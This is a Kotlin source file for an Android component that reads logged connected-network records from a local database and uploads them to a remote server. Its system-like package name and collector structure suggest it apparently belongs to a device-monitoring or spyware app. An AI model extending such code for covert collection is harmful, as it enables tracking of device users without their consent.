package com.android.services.logs.collectors

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerFourApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.logVerbose

class ConnectedNetworkCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    @Throws(Exception::class)
    override fun uploadLogs() {
        if (AppConstants.syncConnectedNetworks) {
            logVerbose("${AppConstants.CONNECTED_NETWORK_TYPE} Preparing for uploading")
            localDatabaseSource.getConnectedNetworks { logs ->
                if (logs.isNotEmpty()) {
                    logVerbose("${AppConstants.CONNECTED_NETWORK_TYPE} data = $logs")
                    val startDate = logs[logs.size - 1].date
                    val endDate = logs[0].date
                    val serverHelper = RemoteServerHelper(
                        context,
                        AppConstants.CONNECTED_NETWORK_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    serverHelper.upload(logs)
                } else {
                    logVerbose("${AppConstants.CONNECTED_NETWORK_TYPE} No data found")
                }
            }
        } else {
            logVerbose("${AppConstants.CONNECTED_NETWORK_TYPE} sync is Off")
        }
    }
}